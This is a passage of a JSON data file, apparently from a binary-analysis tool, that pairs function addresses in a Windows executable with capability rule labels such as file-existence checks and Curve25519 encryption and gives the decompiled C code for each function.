            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.00406b44(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00406b3c();\n    if (iVar1 != 0) {\n        if (*0x4907ac == -1) {\n            fcn.00404d94();\n        }\n        iVar1 = fcn.00406b30();\n        if (iVar1 == 0) {\n            fcn.00404d94();\n        }\n        else {\n            sub.kernel32.dll_TlsSetValue(*0x4907ac, iVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 129
    },
    "004092c8": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong __cdecl fcn.004092c8(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint lDistanceToMove;\n    uint lpDistanceToMoveHigh;\n    \n    lpDistanceToMoveHigh = arg_ch;\n    iVar1 = sub.kernel32.dll_SetFilePointer_1();\n    if (iVar1 == -1) {\n        iVar2 = sub.kernel32.dll_GetLastError_1();\n        if (iVar2 != 0) {\n            lpDistanceToMoveHigh = 0xffffffff;\n        }\n    }\n    return CONCAT44(lpDistanceToMoveHigh, iVar1);\n}\n",
        "token_count": 138
    },
    "00409318": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.00409318(void)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar1 = fcn.00405264();\n    uVar2 = sub.kernel32.dll_GetFileAttributesA(uVar1);\n    if ((uVar2 != 0xffffffff) && ((uVar2 & 0x10) == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 95
    },
    "0040933c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.0040933c(void)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar1 = fcn.00405264();\n    uVar2 = sub.kernel32.dll_GetFileAttributesA(uVar1);\n    if ((uVar2 != 0xffffffff) && ((uVar2 & 0x10) != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 96
    },
    "0040bff8": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040bff8(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x40c05d;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    for (iVar2 = 1; *(iVar2 * 4 + 0x4958ec) != -1; iVar2 = iVar2 + 1) {\n        if (iVar2 == 7) goto code_r0x0040c047;\n    }\n    fcn.00404f98();\n    uVar1 = fcn.00408f00();\n    *(iVar2 * 4 + 0x4958ec) = uVar1;\ncode_r0x0040c047:\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x40c064;\n    uStack24 = 0x40c05c;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 269
    },
    "00418304": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00418304(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00414f48();\n    if (iVar1 != -1) {\n        fcn.00414dd8();\n    }\n    iVar1 = fcn.00414f48();\n    if (iVar1 < 0) {\n        fcn.00414d8c();\n    }\n    return;\n}\n",
        "token_count": 96
    },
    "00418698": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.00418698(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00411bbc();\n    if (iVar1 == -1) {\n        fcn.00418660();\n    }\n    return iVar1;\n}\n",
        "token_count": 58
    },
    "0043c760": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.0043c760(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0043c72c();\n    if (iVar1 == -1) {\n        fcn.004398b8();\n    }\n    fcn.0043c608();\n    return;\n}\n",
        "token_count": 67
    },
    "0043e21c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043e21c(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t in_EDX;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    if ((in_EDX & 0x10) == 0) {\n        iVar1 = sub.user32.dll_GetMenuItemID();\n        if (iVar1 != -1) {\n            iVar3 = fcn.0043d848();\n        }\n    }\n    else {\n        sub.user32.dll_GetSubMenu();\n        iVar3 = fcn.0043d848();\n    }\n    if (iVar3 == 0) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = fcn.00458370();\n    }\n    return uVar2;\n}\n",
        "token_count": 183
    },
    "004538ac": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004538ac(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    uint uVar5;\n    uint *in_FS_OFFSET;\n    uint uStack84;\n    uint uStack80;\n    uchar *puStack76;\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x453ac3;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack52 = 0x4538d9;\n    cVar1 = fcn.00453390();\n    if (cVar1 != '\\0') {\n        puStack52 = 0x4538eb;\n        fcn.00454154();\n        puStack52 = 0x4538f8;\n        iVar2 = fcn.0045376c();\n        if (iVar2 != -1) {\n            uStack56 = 0x453a74;\n            uStack60 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffc4;\n            puStack64 = 0x45391f;\n            puStack52 = &stack0xfffffffc;\n            piVar3 = fcn.00426010();\n            uStack68 = 0x453a54;\n            uStack72 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffb8;\n            puStack76 = 0x45393e;\n            puStack64 = &stack0xfffffffc;\n            (**(*piVar3 + 0x34))();\n            puStack76 = 0x45394c;\n            (**(*piVar3 + 0x40))();\n            puStack76 = 0x453958;\n            piVar4 = fcn.00426010();\n            uStack80 = 0x453a37;\n            uStack84 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffac;\n            puStack76 = &stack0xfffffffc;\n            fcn.00427474();\n            (**(*piVar4 + 0x34))();\n            (**(*piVar4 + 0x40))();\n            fcn.004265e4(0, 0, 0);\n            uVar5 = fcn.00421c8c();\n            uVar5 = fcn.00453564(iVar2, uVar5);\n            sub.comctl32.dll_ImageList_Draw(uVar5);\n            fcn.004265e4(0, 0, 0x10);\n            uVar5 = fcn.00421c8c();\n            uVar5 = fcn.00453564(iVar2, uVar5);\n            sub.comctl32.dll_ImageList_Draw(uVar5);\n            uVar5 = (**(*piVar4 + 0x68))();\n            (**(*piVar3 + 0x68))(uVar5);\n            uVar5 = fcn.00453564();\n            iVar2 = sub.comctl32.dll_ImageList_Replace();\n            if (iVar2 == 0) {\n                fcn.00406a50();\n                fcn.0040c5ac();\n                fcn.004047cc();\n            }\n            *in_FS_OFFSET = uVar5;\n            fcn.00403f58(0x453a3e);\n            return;\n        }\n        puStack52 = 0x453a88;\n        fcn.00406a50();\n        puStack52 = 0x453a97;\n        fcn.0040c5ac();\n        puStack52 = 0x453a9c;\n        fcn.004047cc();\n    }\n    puStack52 = 0x453aa8;\n    fcn.00404154();\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x453aca;\n    uStack44 = 0x453ac2;\n    fcn.00404dc4();\n    return;\n}\n",
        "token_count": 972
    },
    "00453e14": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00453e14(int32_t param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uchar *puStack92;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_28h;\n    uint var_18h;\n    uint var_14h;\n    int32_t *var_10h;\n    int32_t *var_ch;\n    uint himl;\n    uint var_4h;\n    \n    puStack68 = 0x453e3f;\n    himl = param_2;\n    fcn.00413a94(&fcn.00453e14::var_28h, *(in_EAX + 0x30));\n    puStack68 = 0x453e47;\n    fcn.00454ab0();\n    uStack72 = 0x453fad;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    puStack80 = 0x453e61;\n    puStack68 = &stack0xfffffffc;\n    var_ch = fcn.00426010();\n    uStack84 = 0x453f90;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    puStack92 = 0x453e80;\n    puStack80 = &stack0xfffffffc;\n    (**(*var_ch + 0x34))();\n    puStack92 = 0x453e8e;\n    (**(*var_ch + 0x40))();\n    puStack92 = 0x453e9a;\n    var_10h = fcn.00426010();\n    uStack96 = 0x453f73;\n    uStack100 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff9c;\n    puStack92 = &stack0xfffffffc;\n    fcn.00427474();\n    (**(*var_10h + 0x34))();\n    (**(*var_10h + 0x40))();\n    uStack104 = himl;\n    iVar1 = sub.comctl32.dll_ImageList_GetImageCount();\n    if (-1 < iVar1 + -1) {\n        iVar3 = 0;\n        do {\n            if ((param_1 == -1) || (iVar3 == param_1)) {\n                var_14h = fcn.004265e4();\n                fcn.00421878();\n                uVar2 = fcn.00421c8c(0, 0, 0);\n                sub.comctl32.dll_ImageList_Draw(himl, iVar3, uVar2);\n                var_18h = fcn.004265e4();\n                fcn.00421878();\n                fcn.00421c8c(0, 0, 0x10);\n                uStack104 = himl;\n                sub.comctl32.dll_ImageList_Draw();\n                fcn.004536a0();\n            }\n            iVar3 = iVar3 + 1;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = uStack104;\n    uStack96 = 0x453f7a;\n    uStack100 = 0x453f72;\n    fcn.00403f58();\n    return;\n}\n",
        "token_count": 798
    },
    "0045fd90": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.0045fd90(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    \n    uVar1 = sub.user32.dll_LoadCursorA(0, 0x7f00);\n    *(in_EAX + 0x60) = uVar1;\n    iVar2 = -0x16;\n    do {\n        sub.user32.dll_LoadCursorA();\n        fcn.0045fe94();\n        iVar2 = iVar2 + 1;\n    } while (iVar2 != -1);\n    return;\n}\n",
        "token_count": 126
    },
    "00460144": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00460144(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint *puVar2;\n    \n    uVar1 = 0;\n    if (param_2 != -1) {\n        for (puVar2 = *(in_EAX + 0x5c); (puVar2 != NULL && (param_2 != puVar2[1])); puVar2 = *puVar2) {\n        }\n        if (puVar2 == NULL) {\n            uVar1 = *(in_EAX + 0x60);\n        }\n        else {\n            uVar1 = puVar2[2];\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 164
    },
    "00467bd0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t fcn.00467bd0(void)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar1 = fcn.00405264();\n    uVar2 = sub.kernel32.dll_GetFileAttributesA(uVar1);\n    return uVar2 & 0xffffff00 | uVar2 != 0xffffffff;\n}\n",
        "token_count": 78
    },
    "0040e734": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e734(uint arg_8h, int32_t arg_ch, uint noname_2, uint arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x40e78e;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (arg_ch == 0x400) {\n        fcn.00405028();\n        fcn.00408f18();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x40e795;\n    uStack20 = 0x40e78d;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 196
    },
    "0040e7a0": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e7a0(uint arg_8h, int32_t arg_ch, uint noname_2, uint arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x40e7fa;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (arg_ch == 0x400) {\n        fcn.00405028();\n        fcn.0040a470();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x40e801;\n    uStack20 = 0x40e7f9;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 199
    },
    "0040e80c": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e80c(uint arg_8h, int32_t arg_ch, uint noname_2, uint arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x40e866;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (arg_ch == 0x400) {\n        fcn.00405028();\n        fcn.0040a444();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x40e86d;\n    uStack20 = 0x40e865;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 196
    },
    "0040e878": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e878(uint arg_8h, int32_t arg_ch, uint noname_2, uint arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x40e8d2;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (arg_ch == 0x400) {\n        fcn.00405028();\n        fcn.0040bcfc();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x40e8d9;\n    uStack20 = 0x40e8d1;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 200
    },
    "0040e8e4": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e8e4(uint arg_8h, int32_t arg_ch, uint noname_2, uint arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x40e93e;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (arg_ch == 0x400) {\n        fcn.00405028();\n        fcn.0040a49c();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x40e945;\n    uStack20 = 0x40e93d;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 199
    },
    "00411e98": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00411e98(float arg_8h, float arg_ch, uint arg_10h)\n\n{\n    uint8_t uVar1;\n    int32_t *in_EAX;\n    uint8_t *puVar2;\n    int32_t in_EDX;\n    double *pdVar3;\n    code *var_8h;\n    uint var_4h;\n    \n    var_8h = *(in_EDX + 8);\n    puVar2 = fcn.0041196c();\n    uVar1 = *puVar2;\n    if ((var_8h & 0xff000000) == 0xff000000) {\n        pdVar3 = (var_8h & 0xffffff) + in_EAX;\n    // switch table (5 cases) at 0x411ee1\n        switch(uVar1 & 0x7f) {\n        case 0:\n            *pdVar3 = CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h));\n            break;\n        case 1:\n            *pdVar3 = CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h));\n            break;\n        case 2:\n            *pdVar3 = arg_8h;\n            *(pdVar3 + 4) = arg_ch;\n            *(pdVar3 + 1) = arg_10h;\n            break;\n        case 3:\n            *pdVar3 = ROUND(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h)));\n            break;\n        case 4:\n            *pdVar3 = ROUND(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h)) * *0x41208c);\n        }\n    }\n    else {\n        if ((var_8h & 0xff000000) == 0xfe000000) {\n            var_8h = *(*in_EAX + var_8h);\n        }\n        if (*(in_EDX + 0x10) == -0x80000000) {\n    // switch table (5 cases) at 0x411f7d\n            switch(uVar1 & 0x7f) {\n            case 0:\n                (*var_8h)();\n                break;\n            case 1:\n                (*var_8h)(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h)));\n                break;\n            case 2:\n                (*var_8h)(arg_8h, arg_ch, arg_10h);\n                break;\n            case 3:\n                (*var_8h)(ROUND(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h))));\n                break;\n            case 4:\n                (*var_8h)(ROUND(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h)) * *0x41208c));\n            }\n        }\n        else {\n    // switch table (5 cases) at 0x412010\n            switch(uVar1 & 0x7f) {\n            case 0:\n                (*var_8h)();\n                break;\n            case 1:\n                (*var_8h)(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h)));\n                break;\n            case 2:\n                (*var_8h)(arg_8h, arg_ch, arg_10h);\n                break;\n            case 3:\n                (*var_8h)(ROUND(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h))));\n                break;\n            case 4:\n                (*var_8h)(ROUND(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h)) * *0x41208c));\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 814
    },
    "0041797c": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nulong __cdecl fcn.0041797c(uint arg_8h, uint arg_ch)\n\n{\n    ulong uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.004092c8(arg_8h, arg_ch);\n    return uVar1;\n}\n",
        "token_count": 70
    },
    "0041973c": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041973c(uint param_1)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = fcn.0041a764(param_1);\n    // switch table (14 cases) at 0x419772\n    switch(uVar1 & 0x7f) {\n    case 0:\n        fcn.00404df4();\n        break;\n    default:\n        fcn.00418660();\n        break;\n    case 7:\n        fcn.00418c50();\n        fcn.00404e90();\n        fcn.004052bc();\n        fcn.00418c50();\n        break;\n    case 8:\n        fcn.00404df4();\n        break;\n    case 9:\n        fcn.00404df4();\n        break;\n    case 0xd:\n        fcn.00404df4();\n    }\n    return;\n}\n",
        "token_count": 199
    },
    "0041a874": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid fcn.0041a874(void)\n\n{\n    uint32_t uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    var_8h = 0;\n    uStack20 = 0x41aa19;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    uVar1 = fcn.0041a764();\n    // switch table (22 cases) at 0x41a8ab\n    switch(uVar1 & 0x7f) {\n    case 1:\n        fcn.0041a7c0(&stack0xfffffffc);\n        break;\n    case 2:\n        fcn.0041ac80();\n        break;\n    case 3:\n        fcn.0041ac80();\n        break;\n    case 4:\n        fcn.0041ac80();\n        break;\n    case 5:\n        fcn.0041ac80();\n        break;\n    case 6:\n    case 7:\n        fcn.0041a588();\n        break;\n    case 10:\n        fcn.0041a7e8(&stack0xfffffffc);\n        break;\n    case 0xb:\n        fcn.0041a778();\n        break;\n    case 0xc:\n        fcn.0041a7e8(&stack0xfffffffc);\n        break;\n    case 0xe:\n        fcn.0041a818(&stack0xfffffffc);\n        break;\n    case 0xf:\n        fcn.0041ac80();\n        break;\n    case 0x10:\n        fcn.0041ac80();\n        break;\n    case 0x11:\n        fcn.0041ac80();\n        break;\n    case 0x12:\n        fcn.0041a7e8(&stack0xfffffffc);\n        break;\n    case 0x13:\n        fcn.0041ac80();\n        break;\n    case 0x14:\n        fcn.0041a7e8(&stack0xfffffffc);\n        break;\n    case 0x15:\n        fcn.0041ac80();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x41aa20;\n    uStack20 = 0x41aa18;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 555
    },
    "0041ae90": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid fcn.0041ae90(void)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint *in_FS_OFFSET;\n    ulong uVar3;\n    uint in_stack_ffffffc8;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_1ch;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x41b0a2;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    fcn.0040fc3c();\n    uVar2 = fcn.00418c2c();\n    // switch table (22 cases) at 0x41aed2\n    switch(uVar2 & 0x7f) {\n    case 0:\n    case 0xd:\n        cVar1 = fcn.0041a764();\n        if (cVar1 != '\\r') {\n            fcn.004117c0();\n        }\n        break;\n    default:\n        fcn.0040c668();\n        fcn.004047cc();\n        break;\n    case 2:\n        fcn.00419838();\n        fcn.00410f0c();\n        break;\n    case 3:\n        fcn.00419838();\n        fcn.00410f0c();\n        break;\n    case 4:\n        fcn.00419838();\n        fcn.00410f0c();\n        break;\n    case 5:\n        fcn.004195e8();\n        fcn.00410f9c();\n        break;\n    case 6:\n    case 0xc:\n        fcn.0041a5c4();\n        fcn.00410fd8();\n        break;\n    case 8:\n    case 9:\n        fcn.0041a764();\n        fcn.00410f74();\n        break;\n    case 10:\n        in_stack_ffffffc8 = 0x41b045;\n        fcn.0041acc8(&stack0xfffffffc);\n        fcn.0040ff64();\n        break;\n    case 0xf:\n        fcn.00419664();\n        fcn.00410f9c();\n        break;\n    case 0x10:\n        fcn.004196a8();\n        fcn.00410fc4();\n        break;\n    case 0x11:\n        fcn.004196f8();\n        fcn.00410fb0();\n        break;\n    case 0x12:\n    case 0x14:\n        fcn.0041a680();\n        fcn.00411004();\n        break;\n    case 0x13:\n        uVar3 = fcn.004198a4();\n        in_stack_ffffffc8 = uVar3;\n        fcn.00410f48(in_stack_ffffffc8, uVar3 >> 0x20);\n        break;\n    case 0x15:\n        fcn.00419620();\n        fcn.00410f9c();\n    }\n    *in_FS_OFFSET = in_stack_ffffffc8;\n    uStack48 = 0x41b0a9;\n    fcn.0040fc50();\n    fcn.00405580();\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 743
    },
    "00437e48": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid fcn.00437e48(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    do {\n        iVar1 = *(in_EAX + 8 + (uVar2 & 0x7f) * 4);\n        if (iVar1 != 0) {\n            (***0x492aa8)(iVar1);\n            *(in_EAX + 8 + (uVar2 & 0x7f) * 4) = 0;\n        }\n        uVar2 = uVar2 + 1;\n    } while (uVar2 != '\\x18');\n    return;\n}\n",
        "token_count": 154
    },
    "00438084": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00438084(uchar *param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    \n    *param_1 = 0;\n    uVar1 = param_2 & 0xff;\n    if (uVar1 < 0xf) {\n        if (uVar1 - 2 < 5) {\n            *(param_1 + 4) = 1;\n            iVar2 = 2;\n            goto code_r0x004380fc;\n        }\n        if (uVar1 - 7 < 8) {\n            *(param_1 + 4) = 2;\n            iVar2 = 7;\n            goto code_r0x004380fc;\n        }\n    }\n    else {\n        if (uVar1 - 0xf < 0xc) {\n            *(param_1 + 4) = 3;\n            iVar2 = 0xf;\n            goto code_r0x004380fc;\n        }\n        if (uVar1 - 0x1b < 2) {\n            *(param_1 + 4) = 4;\n            iVar2 = 0x1b;\n            goto code_r0x004380fc;\n        }\n        if (uVar1 - 0x1b == 2) {\n            *(param_1 + 4) = 5;\n            iVar2 = 0x1d;\n            goto code_r0x004380fc;\n        }\n    }\n    *(param_1 + 4) = 0;\n    iVar2 = 0;\ncode_r0x004380fc:\n    *(param_1 + 8) = ((param_2 & 0x7f) - iVar2) + 1;\n    return;\n}\n",
        "token_count": 388
    },
    "00438108": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00438108(uchar *param_1, uint32_t param_2)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    \n    *param_1 = 3;\n    uVar1 = param_2 - 2;\n    if (uVar1 < 7) {\n        *(param_1 + 4) = 1;\n        iVar2 = 2;\n    }\n    else if (uVar1 == 7) {\n        *(param_1 + 4) = 2;\n        iVar2 = 9;\n    }\n    else {\n        *(param_1 + 4) = 0;\n        iVar2 = 0;\n    }\n    *(param_1 + 8) = ((param_2 & 0x7f) - iVar2) + 1;\n    return;\n}\n",
        "token_count": 187
    },
    "00438144": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00438144(uchar *param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    *param_1 = 10;\n    // switch table (18 cases) at 0x43816f\n    switch(param_2 & 0xff) {\n    default:\n        *(param_1 + 4) = 0;\n        iVar1 = 0;\n        break;\n    case 2:\n        *(param_1 + 4) = 1;\n        iVar1 = 2;\n        break;\n    case 3:\n        *(param_1 + 4) = 2;\n        iVar1 = 3;\n        break;\n    case 4:\n    case 5:\n    case 6:\n    case 7:\n    case 8:\n    case 9:\n        *(param_1 + 4) = 3;\n        iVar1 = 4;\n        break;\n    case 10:\n    case 0xb:\n    case 0xc:\n    case 0xd:\n        *(param_1 + 4) = 4;\n        iVar1 = 10;\n        break;\n    case 0xe:\n    case 0xf:\n    case 0x10:\n    case 0x11:\n        *(param_1 + 4) = 5;\n        iVar1 = 0xe;\n    }\n    *(param_1 + 8) = ((param_2 & 0x7f) - iVar1) + 1;\n    return;\n}\n",
        "token_count": 332
    },
    "00438230": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
